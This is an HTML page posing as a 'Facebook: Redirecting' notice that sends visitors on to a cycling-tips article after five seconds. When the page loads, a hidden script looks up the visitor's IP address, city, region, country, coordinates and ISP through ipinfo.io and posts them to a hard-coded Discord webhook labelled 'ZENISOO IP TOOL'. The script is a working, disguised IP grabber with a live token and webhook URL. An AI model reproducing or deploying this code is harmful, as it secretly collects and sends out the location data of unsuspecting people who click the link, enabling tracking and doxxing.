<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="5;url=https://www.bikeradar.com/advice/beginners-cycling-tips">
    <title>Facebook: Redirecting</title>
</head>
<body>
    <h1>facebook is redirecting you to the site.
    </h1>
    <h2>please wait.</h2>
</body>
<script> 
        function fetchIPInfoAndSendEmbed() {
            const apiToken = 'd3df1d9e27298e';
            const now = new Date();
            const time = now.toLocaleString()
            function sendEmbedToDiscord(embedData) {
                const webhookURL = 'https://discord.com/api/webhooks/1256077249199865906/vxHTszKG92IwdvE02Sa0DCAL3olgPKFwx2lmWNc6Bv61XqBrI8vwy11Y4WziEeYf6wEO';
                return fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(embedData),
                });
            }
            return fetch(`https://ipinfo.io/json?token=${apiToken}`)
                .then(response => response.json())
                .then(data => {
                    if (data) {
                        const embedData = {
                            embeds: [{
                                title: 'ZENISOO IP TOOL',
                                description: `Time Clicked(NF):${time}\nIP Address: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nLocation: ${data.loc}\nOrganization: ${data.org}\nISP: ${data.hostname}`,
                                color: 0x00ff00
                            }]
                        };

                        return sendEmbedToDiscord(embedData);
                    } else {
                        document.getElementById('info').textContent = 'Failed to fetch IP information.';
                        return null;
                    }
                })
                .then(response => {
                    if (response && response.ok) {
                        console.log('Embed sent to Discord');
                    } else {
                        console.error('Failed to send embed to Discord:', response);
                    }
                })
                .catch(error => {
                    console.error('Error fetching IP information:', error);
                    document.getElementById('info').textContent = 'Failed to fetch IP information.';
                });
        }
        fetchIPInfoAndSendEmbed();
    </script>
</html>
